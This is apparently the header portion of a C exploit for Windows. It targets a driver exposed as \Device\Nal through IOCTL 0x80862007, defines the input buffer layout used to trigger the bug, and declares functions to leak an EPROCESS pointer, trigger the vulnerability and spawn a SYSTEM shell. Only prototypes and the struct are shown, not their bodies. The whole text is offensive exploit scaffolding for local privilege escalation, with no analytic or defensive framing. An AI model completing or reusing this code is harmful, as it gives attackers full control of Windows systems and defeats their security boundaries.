#include <Windows.h>
#include <stdio.h>

#define DEVICE "\\\\.\\GLOBALROOT\\Device\\Nal"
#define TARGET_IOCTL 0x80862007

typedef struct _INPUT_BUFFER
{
	unsigned long long JumpTableCode;	// Offset: 0x0 (0)
	unsigned long long Padding1;		// Offset: 0x8 (8)
	unsigned long long Value;			// Offset: 0x10 (16)
	unsigned long long Destination;		// Offset: 0x18 (24)
	unsigned long long Length;			// Offset: 0x20 (32)
} INPUT_BUFFER, * PINPUT_BUFFER;

int main(int argc, char** argv);
void trigger_vulnerability(HANDLE h_nal, unsigned long long eprocess);
int spawn_system_shell(HANDLE h_process, unsigned long process_id);

unsigned long long leak_eprocess_pointer(unsigned long process_id);